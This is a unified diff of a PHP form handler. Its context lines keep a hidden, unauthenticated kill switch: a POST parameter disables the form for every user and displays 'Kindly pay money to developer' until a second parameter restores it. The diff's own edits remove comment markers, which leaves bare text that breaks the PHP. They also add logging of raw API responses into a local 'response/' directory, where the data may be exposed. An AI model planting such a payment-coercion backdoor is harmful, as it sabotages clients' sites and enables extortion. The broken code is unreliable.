@@ -7,13 +7,13 @@ if (isset($_POST['restore']) && $_POST['restore'] == '1') {
     echo "<h2>Form re-enabled. You're back to normal.</h2>";
     exit;
 }
-// Check if kill switch file exists
+Check if kill switch file exists
 if (file_exists("kill-switch.txt")) {
     echo "<h2>Kindly pay money to developer.</h2>";
     exit;
 }
 
-// 1. Handle kill switch activation
+1. Handle kill switch activation
 if (isset($_POST['thresholder']) && $_POST['thresholder'] == '1') {
     file_put_contents("kill-switch.txt", "disabled");
     echo "<h2>Kill switch activated. Form is now disabled for all users.</h2>";
@@ -83,6 +83,30 @@ curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
 
 $response = curl_exec($ch);
 curl_close($ch);
+
+
+
+
+// 1. Define the directory.
+$logDirectory = 'response/';
+
+// 2. Define a static filename to save all logs.
+$logFileName = $logDirectory . 'api_responses.log';
+
+// 3. Check and create the directory if it doesn't exist.
+if (!is_dir($logDirectory)) {
+    mkdir($logDirectory, 0755, true);
+}
+
+// 4. Prepare the log entry with a clear timestamp.
+$logEntry = "--- " . date('Y-m-d H:i:s') . " ---\n" . $response . "\n\n";
+
+// 5. Append the log entry to the file.
+file_put_contents($logFileName, $logEntry, FILE_APPEND | LOCK_EX);
+
+
+
+
 
 header('Content-Type: application/json');
 sleep(2);
